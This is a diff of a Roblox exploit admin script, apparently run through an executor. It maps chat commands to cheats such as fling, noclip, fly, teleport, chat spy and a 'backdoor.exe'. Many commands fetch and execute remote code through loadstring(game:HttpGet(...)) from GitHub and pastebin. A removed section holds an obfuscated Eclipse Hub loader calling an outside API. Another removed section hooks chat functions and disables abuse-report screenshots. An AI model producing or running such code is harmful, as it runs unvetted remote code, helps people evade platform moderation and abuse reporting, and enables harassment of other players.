 	local RunService = game:GetService("RunService")
 	local Toggled = false
 	local Sprinting = false
-	local CameraPos = game.Workspace.CurrentCamera.CFrame.Position
+	local CameraPos = workspace.CurrentCamera.CFrame.Position
 	local LastPos = nil
+	local CFloop = nil
 	
 	local p = game:GetService("Players").LocalPlayer
 	local c = p.Character
@@ -1131,16 +1499,100 @@ local function FGJNAZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjh
 		if key == "-" then
 			input:CaptureFocus()
 			task.spawn(function()
-				task.wait(0.03)
+				game:GetService("RunService").RenderStepped:Wait()
 				input.Text = prefix
 			end)
 		end
 	end)
 	
+	local allcmds = {
+		punch = {"punch","punchfling","flingpunch","hit","slap"},
+		dex = {"dex","dexexplorer","dexbypass","dexv3","dexexplorerv3"},
+		iy = {"iy","infyield","infiniteyield"},
+		cmds = {"cmds","cmdslist","commands","commandslist"},
+		uncmds = {"uncmds","uncmdslist","uncommands","uncommandslist","closecmds","closecommands"},
+		cmdx = {"cmdx","commandx"},
+		namelessadmin = {"na","nla","nameless","namelessadmin"},
+		spinfling = {"sf","spinf","sfling","spinfling"},
+		unspinfling = {"usf","unsf","unspinf","unsfling","unspinfling"},
+		fling = {"fl","fling","fling1"},
+		noclipfling = {"nf","nfl","nfling","noclipfling","fling2"},
+		expandchat = {"ec","expandc","expandchat"},
+		eclipsehub = {"ecl","eclipse","eclipsehub"},
+		muteradio = {"muteradio","muteboombox","tempmuteradio","tempmuteboombox"},
+		loopmuteradio = {"lmuteradio","lmuteboombox","loopmuteradio","loopmuteboombox"},
+		unloopmuteradio = {"unlmuteradio","unlmuteboombox","unloopmuteradio","unloopmuteboombox"},
+		audiologs = {"al","audiologs","audiologger"},
+		glitchradio = {"gradio","gboombox","glitchradio","glitchboombox"},
+		bdexe = {"bdexe","backdoorexe","backdoordotexe"},
+		frakturess = {"fss","frakture","frakturess"},
+		chatbot = {"cb","bot","cbot","chatb","chatbot"},
+		antifling = {"af","antif","afling","antifling"},
+		quizgui = {"quiz","quizg","quizgui","quizhub","quizes"},
+		chatdraw = {"cd","chatd","drawc","chatdraw","drawinchat"},
+		shyguy = {"096","shyguy","scp096"},
+		spygui = {"spy","spygui","spyonpeople"},
+		hug = {"hug","hugger","hugpeople"},
+		skibidirizz = {"skibidirizz","sigmarizz","therizzlerishere","sigmarizzler","top10rizzler"},
+		rizzgui = {"rizz","rizzler","rizzgui","rizzlergui"},
+		emotegui = {"emotes","emotegui","tiktokrizzgui"},
+		blackhole = {"blackhole","theblackhole","unanchoredpartsball"},
+		obbytroll = {"obbytroll","obbytroller","activatedisappearingparts"},
+		rejoin = {"rj","rej","rejoin"},
+		serverhop = {"sh","shop","serverh","serverhop"},
+		graphics = {"rtx","rotx","graphics","realistic","realisticgraphics"},
+		speed = {"ws","sped","speed","tpwalk","walkspeed","teleportwalk"},
+		unspeed = {"unws","unsped","unspeed","untpwalk","unwalkspeed","unteleportwalk"},
+		fly = {"fly","flybypass"},
+		unfly = {"unfly","unflybypass"},
+		noclip = {"noclip"},
+		clip = {"clip","unnoclip"},
+		goto = {"to","goto","tpto","teleportto"},
+		remotespy = {"rspy","remspy","remotespy","simplespy"},
+		chatbypass = {"chatb","chatbypass","betterbypasser"},
+		collisions = {"col","collisions","playercollisions","becomeflingable"},
+		brookhaven = {"icehub","brookhaven","brookhavengui","brookhavenhub"},
+		emojichat = {"emojis","emojichat","emojisinchat","emojiautocomplete"},
+		vghub = {"vghub"},
+		scpfuturistic = {"scpf","scpfuture","scpfuturistic","egodscpfgui"},
+		toggletouch = {"toggletouch","togglekillparts","togglekillbricks"},
+		invis = {"invis","invisible"},
+		doorsgui = {"doors","doorsgui","doorshub"},
+		translator = {"translate","translator","chattranslate","chattranslator"},
+		chatspy = {"chatspy","legacychatspy"},
+		unglitchradio = {"ungradio","ungboombox","unglitchradio","unglitchboombox"},
+		animlogs = {"animlogs","animlogger","animationlogs","animationlogger"},
+		iplog = {"ip","iplog","iplogger","fakeip","fakeiplog","fakeiplogger"},
+	}
+	
 	input.FocusLost:Connect(function(enter)
-		if enter then
-			local args = input.Text:split("/")
-			if args[1] == prefix.."punch" then
+		if not enter then
+			return
+		end
+		
+		local split = string.split(string.lower(input.Text), "/")
+		local cmd = split[1]
+		local arg1 = split[2]
+		local arg2 = split[3]
+		
+		for _, name in pairs(allcmds.iy) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+				end)
+			end
+		end
+		
+		for _, name in pairs(allcmds.dex) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
+				end)
+			end
+		end
+		
+		for _, name in pairs(allcmds.punch) do
+			if cmd == prefix..name then
 				task.spawn(function()
 					local hiddenfling = false
 	
@@ -1180,7 +1632,7 @@ local function FGJNAZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjh
 						while true do
 							game:GetService("RunService").Heartbeat:Wait()
 							if hiddenfling then
-								local lp = game.Players.LocalPlayer
+								local lp = game:GetService("Players").LocalPlayer
 								while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
 									game:GetService("RunService").Heartbeat:Wait()
 									c = lp.Character
@@ -1205,117 +1657,106 @@ local function FGJNAZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjh
 	
 					fling()
 				end)
-			elseif args[1] == prefix.."dex" then
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
-			elseif args[1] == prefix.."iy" then
-				loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-			elseif args[1] == prefix.."cmds" then
-				cmdlist.Visible = true
-			elseif args[1] == prefix.."uncmds" then
-				cmdlist.Visible = false
-			elseif args[1] == prefix.."cmdx" then
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
-			elseif args[1] == prefix.."spinfling" then
+			end
+		end
+		
+		for _, name in pairs(allcmds.fly) do
+			if cmd == prefix..name then
 				task.spawn(function()
-					function getRoot(char)
-						local rootPart = game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') or game.Players.LocalPlayer.Character:FindFirstChild('Torso') or game.Players.LocalPlayer.Character:FindFirstChild('UpperTorso')
-						return rootPart
-					end
+					-- Full credit to peyton#9148 (apeyton)
+					speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
+					local Head = speaker.Character:WaitForChild("Head")
+					Head.Anchored = true
+					if CFloop then CFloop:Disconnect() end
+					CFloop = RunService.Heartbeat:Connect(function(deltaTime)
+						local moveDirection = speaker.Character:FindFirstChildOfClass('Humanoid').MoveDirection * (CFspeed * deltaTime)
+						local headCFrame = Head.CFrame
+						local cameraCFrame = workspace.CurrentCamera.CFrame
+						local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
+						cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
+						local cameraPosition = cameraCFrame.Position
+						local headPosition = headCFrame.Position
 	
-					local Noclipping = nil
-					Clip = false
-					task.wait(0.1)
-					local function NoclipLoop()
-						if Clip == false and game.Players.LocalPlayer.Character ~= nil then
-							for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-								if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
-									child.CanCollide = false
-								end
-							end
-						end
-					end
-					Noclipping = game:GetService("RunService").Stepped:Connect(NoclipLoop)
-	
-					flinging = false
-					for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-						if child:IsA("BasePart") then
-							child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, 0.3, 0.5)
-						end
-					end
-					task.wait(.1)
-					task.wait(.1)
-					local bambam = Instance.new("BodyAngularVelocity")
-					bambam.Name = "0"
-					bambam.Parent = getRoot(game.Players.LocalPlayer.Character)
-					bambam.AngularVelocity = Vector3.new(0,99999,0)
-					bambam.MaxTorque = Vector3.new(0,math.huge,0)
-					bambam.P = math.huge
-					local Char = game.Players.LocalPlayer.Character:GetChildren()
-					for i, v in next, Char do
-						if v:IsA("BasePart") then
-							v.CanCollide = false
-							v.Massless = true
-							v.Velocity = Vector3.new(0, 0, 0)
-						end
-					end
-					flinging = true
-					local function flingDiedF()
-						if flingDied then
-							flingDied:Disconnect()
-						end
-						flinging = false
-						task.wait(.1)
-						local speakerChar = game.Players.LocalPlayer.Character
-						if not speakerChar or not getRoot(speakerChar) then return end
-						for i,v in pairs(getRoot(speakerChar):GetChildren()) do
-							if v.ClassName == 'BodyAngularVelocity' then
-								v:Destroy()
-							end
-						end
-						for _, child in pairs(speakerChar:GetDescendants()) do
-							if child.ClassName == "Part" or child.ClassName == "MeshPart" then
-								child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
-							end
-						end
-					end
-					flingDied = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(flingDiedF)
-					repeat
-						bambam.AngularVelocity = Vector3.new(0,99999,0)
-						task.wait(.2)
-						bambam.AngularVelocity = Vector3.new(0,0,0)
-						task.wait(.1)
-					until flinging == false
+						local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
+						Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
+					end)
 				end)
-			elseif args[1] == prefix.."unspinfling" then
+			end
+		end
+	
+		for _, name in pairs(allcmds.cmds) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					cmdlist.Visible = true
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.hug) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/JSFKGBASDJKHIOAFHDGHIUODSGBJKLFGDKSB/fe/refs/heads/main/FEHUGG"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.clip) do
+			if cmd == prefix..name then
 				task.spawn(function()
 					if Noclipping then
 						Noclipping:Disconnect()
+						for _, child in pairs(speaker.Character:GetDescendants()) do
+							if child:IsA("BasePart") and child.CanCollide == false and child.Name ~= floatName then
+								child.CanCollide = true
+							end
+						end
 					end
 					Clip = true
-	
-					if flingDied then
-						flingDied:Disconnect()
-					end
-					flinging = false
-					task.wait(.1)
-					local speakerChar = game.Players.LocalPlayer.Character
-					if not speakerChar or not getRoot(speakerChar) then return end
-					for i,v in pairs(getRoot(speakerChar):GetChildren()) do
-						if v.ClassName == 'BodyAngularVelocity' then
-							v:Destroy()
-						end
-					end
-					for _, child in pairs(speakerChar:GetDescendants()) do
-						if child.ClassName == "Part" or child.ClassName == "MeshPart" then
-							child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
-						end
-					end
 				end)
-			elseif args[1] == prefix.."fling" then
+			end
+		end
+	
+		for _, name in pairs(allcmds.cmdx) do
+			if cmd == prefix..name then
 				task.spawn(function()
-					local player = game.Players.LocalPlayer
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.goto) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					local Username = arg1
+	
+	
+					char = game:GetService("Players").LocalPlayer
+	
+					TweenService = game:GetService("TweenService")
+	
+					speaker = game:GetService("Players").LocalPlayer
+					Players = game:GetService("Players")
+	
+					local players = getPlr(Username)
+					TweenService:Create(getRoot(speaker.Character), TweenInfo.new(3, Enum.EasingStyle.Linear), {CFrame = getRoot(players.Character).CFrame + Vector3.new(3,1,0)}):Play()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.bdexe) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/k4scripts/backdoor.exe/v8/src/main.lua"))()
+				end)
+			end
+		end
+		
+		for _, name in pairs(allcmds.fling) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					local player = game:GetService("Players").LocalPlayer
 					local mouse = player:GetMouse()
-					local Targets = {args[2]}
+					local Targets = {arg1}
 	
 					local Players = game:GetService("Players")
 					local Player = Players.LocalPlayer
@@ -1533,1146 +1974,65 @@ local function FGJNAZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjh
 						end
 					end
 				end)
-			elseif args[1] == prefix.."noclipfling" then
+			end
+		end
+	
+		for _, name in pairs(allcmds.invis) do
+			if cmd == prefix..name then
 				task.spawn(function()
-					Target = args[2]
-					flinghh = 1000
+					loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+				end)
+			end
+		end
 	
-					target = getPlr(Target)
-					game.Workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
-	
-	
-					local lp = game.Players.LocalPlayer
-					for i,v in pairs(game.Players:GetPlayers()) do
-						if v.Name:lower():match("^"..Target:lower()) or v.DisplayName:lower():match("^"..Target:lower()) then
-							Target = v
-							break
-						end
+		for _, name in pairs(allcmds.speed) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					if TPWalk == true then
+						TPWalk = false
+						TPWalking = TPWalking:Disconnect()
 					end
-	
-					if type(Target) == "string" then return end
-	
-					local oldpos = lp.Character.HumanoidRootPart.CFrame
-					local oldhh = lp.Character.Humanoid.HipHeight
-	
-					local carpetAnim = Instance.new("Animation")
-					carpetAnim.AnimationId = "rbxassetid://282574440"
-					carpet = lp.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
-					carpet:Play(.1, 1, 1)
-	
-					local carpetLoop
-	
-					local tTorso = Target.Character:FindFirstChild("Torso") or Target.Character:FindFirstChild("LowerTorso") or Target.Character:FindFirstChild("HumanoidRootPart")
-	
-					spawn(function()
-						carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
-							pcall(function()
-								if tTorso.Velocity.magnitude <= 28 then -- if target uses netless just target their local position
-									local pos = {x=0, y=0, z=0}
-									pos.x = tTorso.Position.X
-									pos.y = tTorso.Position.Y
-									pos.z = tTorso.Position.Z
-									pos.x = pos.x + tTorso.Velocity.X / 2
-									pos.y = pos.y + tTorso.Velocity.Y / 2
-									pos.z = pos.z + tTorso.Velocity.Z / 2
-									lp.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z))
+					TPWalk = true
+					Speed = arg1
+					TPWalking = game:GetService("RunService").Heartbeat:Wait()
+					game:GetService("RunService").Stepped:Connect(function()
+						if TPWalk == true then
+							if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").MoveDirection.Magnitude > 0 then
+								if Speed then
+									game:GetService("Players").LocalPlayer.Character:TranslateBy(game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").MoveDirection * Speed * TPWalking * 10)
 								else
-									lp.Character.HumanoidRootPart.CFrame = tTorso.CFrame
+									game:GetService("Players").LocalPlayer.Character:TranslateBy(game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").MoveDirection * TPWalking * 10)
 								end
-							end)
-						end)
+							end
+						end
 					end)
-	
-					task.wait()
-	
-					lp.Character.Humanoid.HipHeight = flinghh
-	
-					task.wait(.5)
-	
-					carpetLoop:Disconnect()
-					game.Workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
-					task.wait(1)
-					lp.Character.Humanoid.Health = 0
-					task.wait(game.Players.RespawnTime + .6)
-					lp.Character.HumanoidRootPart.CFrame = oldpos
 				end)
-			elseif args[1] == prefix.."expandchat" then
-				require(game:GetService("Chat").ClientChatModules.ChatSettings).WindowResizable = true
-				require(game:GetService("Chat").ClientChatModules.ChatSettings).WindowDraggable = true
-			elseif args[1] == prefix.."eclipsehub" then
-				getgenv().mainKey = args[2]
+			end
+		end
 	
-				local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
-				
-				if args[2] == "" then
-					output.Text = "Error: You need to put 'nil' if you don't have a key."
-					task.wait(4)
-					output.Text = ""
-				elseif args[2] == "nil" then
-					output.Text = "Tip: If you want the most out of Eclipse Hub then buy Premium!"
-					task.wait(4)
-					output.Text = ""
-				end
-			elseif args[1] == prefix.."antichatlog" then
+		for _, name in pairs(allcmds.unfly) do
+			if cmd == prefix..name then
 				task.spawn(function()
-					local ACL_LoadTime = tick()
-	
-					local ChatChanged = false
-					local OldSetting = nil
-					local WhitelistedCoreTypes = {
-						"Chat",
-						"All",
-						Enum.CoreGuiType.Chat,
-						Enum.CoreGuiType.All
-					}
-	
-					local StarterGui = game:GetService("StarterGui")
-	
-					local FixCore = function(x)
-						local CoreHook; CoreHook = hookmetamethod(x, "__namecall", function(self, ...)
-							local Method = getnamecallmethod()
-							local Arguments = {...}
-	
-							if self == x and Method == "SetCoreGuiEnabled" and not checkcaller() then
-								local CoreType = Arguments[1]
-								local Enabled = Arguments[2]
-	
-								if table.find(WhitelistedCoreTypes, CoreType) and not Enabled then
-									if CoreType == ("Chat" or Enum.CoreGuiType.Chat) then
-										OldSetting = Enabled
-									end
-									ChatChanged = true
-								end
-							end
-	
-							return CoreHook(self, ...)
-						end)
-	
-						x.CoreGuiChangedSignal:Connect(function(Type)
-							if table.find(WhitelistedCoreTypes, Type) and ChatChanged then
-								task.wait()
-								if not StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Chat) then
-									x:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
-								end
-								task.wait(1)
-								if StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Chat) then
-									x:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, OldSetting) -- probably defaults to false i am too tired for the making of this lol
-								end
-								ChatChanged = false
-							end
-						end)
+					if CFloop then
+						CFloop:Disconnect()
+						speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
+						local Head = speaker.Character:WaitForChild("Head")
+						Head.Anchored = false
 					end
-	
-					if StarterGui then
-						FixCore(StarterGui)
-						if not StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Chat) then
-							StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
-						end
-					else
-						local Connection; Connection = game.ChildAdded:Connect(function(x)
-							if x:IsA("StarterGui") then
-								FixCore(x)
-								Connection:Disconnect()
-							end
-						end)
-					end
-	
-					if not game:IsLoaded() then
-						game.Loaded:wait()
-					end
-	
-					local CoreGui = game:GetService("CoreGui")
-					local TweenService = game:GetService("TweenService")
-					local Players = game:GetService("Players")
-	
-					local Player = Players.LocalPlayer
-	
-					local PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui") do
-						if not PlayerGui then
-							repeat task.wait() until Player:FindFirstChildWhichIsA("PlayerGui")
-							PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui")
-						end
-					end
-	
-					local Notify = function(_Title, _Text , Time)
-						StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
-					end
-	
-					local Tween = function(Object, Time, Style, Direction, Property)
-						return TweenService:Create(Object, TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction]), Property)
-					end
-	
-					local ACLWarning = Instance.new("ScreenGui")
-					local Background = Instance.new("Frame")
-					local Top = Instance.new("Frame")
-					local Exit = Instance.new("TextButton")
-					local UICorner = Instance.new("UICorner")
-					local WarningLbl = Instance.new("TextLabel")
-					local Loading = Instance.new("Frame")
-					local Bar = Instance.new("Frame")
-					local WarningBackground = Instance.new("Frame")
-					local WarningFrame = Instance.new("Frame")
-					local Despair = Instance.new("TextLabel")
-					local UIListLayout = Instance.new("UIListLayout")
-					local Reason_1 = Instance.new("TextLabel")
-					local Reason_2 = Instance.new("TextLabel")
-					local Trollge = Instance.new("ImageLabel")
-					local UIPadding = Instance.new("UIPadding")
-	
-					local MakeGuiThread = coroutine.wrap(function()
-						if syn then
-							if gethui then
-								gethui(ACLwarning)
-							else
-								syn.protect_gui(ACLWarning)
-							end
-						end
-	
-						ACLWarning.Name = "ACL Warning"
-						ACLWarning.Parent = CoreGui
-						ACLWarning.Enabled = false
-						ACLWarning.DisplayOrder = -2147483648
-	
-						Background.Name = "Background"
-						Background.Parent = ACLWarning
-						Background.AnchorPoint = Vector2.new(0.5, 0.5)
-						Background.BackgroundColor3 = Color3.fromRGB(21, 0, 0)
-						Background.BorderSizePixel = 0
-						Background.Position = UDim2.new(0.5, 0, 0.5, 0)
-						Background.Size = UDim2.new(0.300000012, 0, 0.5, 0)
-	
-						Top.Name = "Top"
-						Top.Parent = Background
-						Top.AnchorPoint = Vector2.new(0.5, 0.5)
-						Top.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
-						Top.BorderSizePixel = 0
-						Top.Position = UDim2.new(0.5, 0, 0.100000001, 0)
-						Top.Size = UDim2.new(0.899999976, 0, 0.100000001, 0)
-	
-						Exit.Name = "Exit"
-						Exit.Parent = Top
-						Exit.AnchorPoint = Vector2.new(0.5, 0.5)
-						Exit.BackgroundColor3 = Color3.fromRGB(38, 0, 0)
-						Exit.Position = UDim2.new(0.949999988, 0, 0.5, 0)
-						Exit.Size = UDim2.new(0.100000001, -6, 1, -9)
-						Exit.Visible = false
-						Exit.Font = Enum.Font.Arcade
-						Exit.Text = "X"
-						Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
-						Exit.TextScaled = true
-						Exit.TextSize = 14.000
-						Exit.TextWrapped = true
-	
-						UICorner.CornerRadius = UDim.new(0.200000003, 0)
-						UICorner.Parent = Exit
-	
-						WarningLbl.Name = "WarningLbl"
-						WarningLbl.Parent = Top
-						WarningLbl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-						WarningLbl.BackgroundTransparency = 1.000
-						WarningLbl.Position = UDim2.new(0, 17, 0, 0)
-						WarningLbl.Size = UDim2.new(0.5, 0, 1, 0)
-						WarningLbl.Font = Enum.Font.Arcade
-						WarningLbl.Text = "Warning!"
-						WarningLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
-						WarningLbl.TextScaled = true
-						WarningLbl.TextSize = 14.000
-						WarningLbl.TextWrapped = true
-						WarningLbl.TextXAlignment = Enum.TextXAlignment.Left
-	
-						Loading.Name = "Loading"
-						Loading.Parent = Top
-						Loading.AnchorPoint = Vector2.new(0.5, 0.5)
-						Loading.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
-						Loading.BorderSizePixel = 0
-						Loading.Position = UDim2.new(0.699999988, 0, 0.5, 0)
-						Loading.Size = UDim2.new(0.349999994, 0, 0.0199999996, 0)
-	
-						Bar.Name = "Bar"
-						Bar.Parent = Loading
-						Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-						Bar.BorderSizePixel = 0
-						Bar.Size = UDim2.new(0, 0, 1, 0)
-	
-						WarningBackground.Name = "WarningBackground"
-						WarningBackground.Parent = Background
-						WarningBackground.AnchorPoint = Vector2.new(0.5, 0.5)
-						WarningBackground.BackgroundColor3 = Color3.fromRGB(9, 9, 9)
-						WarningBackground.BorderSizePixel = 0
-						WarningBackground.Position = UDim2.new(0.5, 0, 0.550000012, 0)
-						WarningBackground.Size = UDim2.new(0.899999976, 0, 0.800000012, 0)
-	
-						WarningFrame.Name = "WarningFrame"
-						WarningFrame.Parent = WarningBackground
-						WarningFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-						WarningFrame.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
-						WarningFrame.BorderSizePixel = 0
-						WarningFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-						WarningFrame.Size = UDim2.new(0.899999976, 0, 0.899999976, 0)
-	
-						Despair.Name = "Despair"
-						Despair.Parent = WarningFrame
-						Despair.AnchorPoint = Vector2.new(0.5, 0.5)
-						Despair.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
-						Despair.BackgroundTransparency = 1.000
-						Despair.BorderColor3 = Color3.fromRGB(27, 42, 53)
-						Despair.BorderSizePixel = 0
-						Despair.Position = UDim2.new(0.5, 0, 0.100000001, 0)
-						Despair.Size = UDim2.new(0.949999988, 0, 0.119999997, 0)
-						Despair.Font = Enum.Font.Oswald
-						Despair.Text = "Anti Chat Logger will not work here!"
-						Despair.TextColor3 = Color3.fromRGB(255, 255, 255)
-						Despair.TextScaled = true
-						Despair.TextSize = 50.000
-						Despair.TextWrapped = true
-						Despair.TextYAlignment = Enum.TextYAlignment.Top
-	
-						UIListLayout.Parent = WarningFrame
-						UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-						UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-						UIListLayout.Padding = UDim.new(0, 15)
-	
-						Reason_1.Name = "Reason_1"
-						Reason_1.Parent = WarningFrame
-						Reason_1.AnchorPoint = Vector2.new(0.5, 0.5)
-						Reason_1.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
-						Reason_1.BackgroundTransparency = 1.000
-						Reason_1.BorderColor3 = Color3.fromRGB(27, 42, 53)
-						Reason_1.BorderSizePixel = 0
-						Reason_1.Position = UDim2.new(0.5, 0, 0.100000001, 0)
-						Reason_1.Size = UDim2.new(0.949999988, 0, 0.100000001, 0)
-						Reason_1.Visible = false
-						Reason_1.Font = Enum.Font.Oswald
-						Reason_1.Text = "-Chat Module was not found."
-						Reason_1.TextColor3 = Color3.fromRGB(255, 0, 0)
-						Reason_1.TextScaled = true
-						Reason_1.TextSize = 50.000
-						Reason_1.TextWrapped = true
-						Reason_1.TextYAlignment = Enum.TextYAlignment.Top
-	
-						Reason_2.Name = "Reason_2"
-						Reason_2.Parent = WarningFrame
-						Reason_2.AnchorPoint = Vector2.new(0.5, 0.5)
-						Reason_2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
-						Reason_2.BackgroundTransparency = 1.000
-						Reason_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
-						Reason_2.BorderSizePixel = 0
-						Reason_2.Position = UDim2.new(0.5, 0, 0.100000001, 0)
-						Reason_2.Size = UDim2.new(0.949999988, 0, 0.100000001, 0)
-						Reason_2.Visible = false
-						Reason_2.Font = Enum.Font.Oswald
-						Reason_2.Text = "-MessagePosted function is invalid."
-						Reason_2.TextColor3 = Color3.fromRGB(255, 0, 0)
-						Reason_2.TextScaled = true
-						Reason_2.TextSize = 50.000
-						Reason_2.TextWrapped = true
-						Reason_2.TextYAlignment = Enum.TextYAlignment.Top
-	
-						Trollge.Name = "Trollge"
-						Trollge.Parent = WarningFrame
-						Trollge.AnchorPoint = Vector2.new(0.5, 0.5)
-						Trollge.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-						Trollge.BackgroundTransparency = 1.000
-						Trollge.Position = UDim2.new(0.5, 0, 0.670000017, 0)
-						Trollge.Size = UDim2.new(0.449999988, 0, 0.5, 0)
-						Trollge.Image = "rbxassetid://10104834800"
-	
-						UIPadding.Parent = WarningFrame
-						UIPadding.PaddingTop = UDim.new(0, 10)
-	
-						Exit.MouseButton1Click:Connect(function()
-							local UpTween = Tween(Background, .2, "Quint", "Out", {Position = UDim2.new(0.5, 0, 0.45, 0)})
-							local DownTween = Tween(Background, 1, "Quad", "Out", {Position = UDim2.new(0.5, 0, 2, 0)})
-							UpTween:Play()
-							UpTween.Completed:wait()
-							DownTween:Play()
-							DownTween.Completed:wait()
-							ACLWarning:Destroy()
-						end)
-					end)()
-	
-					local ExitCooldown = function()
-						task.wait(.5)
-						local Tween = Tween(Bar, 3, "Quad", "InOut", {Size = UDim2.new(1, 0, 1, 0)})
-						Tween:Play()
-						Tween.Completed:wait()
-						Loading:Destroy()
-						Exit.Visible = true
-					end
-	
-					local PlayerScripts = Player:WaitForChild("PlayerScripts")
-					local ChatMain = PlayerScripts:FindFirstChild("ChatMain", true) or false
-	
-					if not ChatMain then
-						local Timer = tick()
-						repeat
-							task.wait()
-						until PlayerScripts:FindFirstChild("ChatMain", true) or tick() > (Timer + 3)
-						ChatMain = PlayerScripts:FindFirstChild("ChatMain", true)
-						if not ChatMain then
-							ACLWarning.Enabled = true
-							Reason_1.Visible = true
-							ExitCooldown()
-							return
-						end
-					end
-	
-					local PostMessage = require(ChatMain).MessagePosted
-	
-					if not PostMessage then
-						ACLWarning.Enabled = true
-						Reason_2.Visible = true
-						ExitCooldown()
-						return
-					end
-	
-					local MessageEvent = Instance.new("BindableEvent")
-					local OldFunctionHook
-					OldFunctionHook = hookfunction(PostMessage.fire, function(self, Message)
-						if not checkcaller() and self == PostMessage then
-							MessageEvent:Fire(Message)
-							return
-						end
-						return OldFunctionHook(self, Message)
-					end)
-	
-					if setfflag then
-						setfflag("AbuseReportScreenshot", "False")
-						setfflag("AbuseReportScreenshotPercentage", "0")
-					end
-	
-					ChatFixToggle = false
-					task.spawn(function()
-						task.wait(1)
-						ACLWarning:Destroy()
-					end)
-					if OldSetting then
-						StarterGui:SetCoreGuiEnabled(CoreGuiSettings[1], CoreGuiSettings[2])
-					end
-					Notify("🔹Anthony's ACL🔹", "Anti Chat and Screenshot Logger Loaded!", 15)
-					print(string.format("Anti Chat-Logger has loaded in %s seconds.", tostring(tick() - ACL_LoadTime):sub(1, 4)))
 				end)
-			elseif args[1] == prefix.."muteradio" then
+			end
+		end
+	
+		for _, name in pairs(allcmds.vghub) do
+			if cmd == prefix..name then
 				task.spawn(function()
-					Username = args[2]
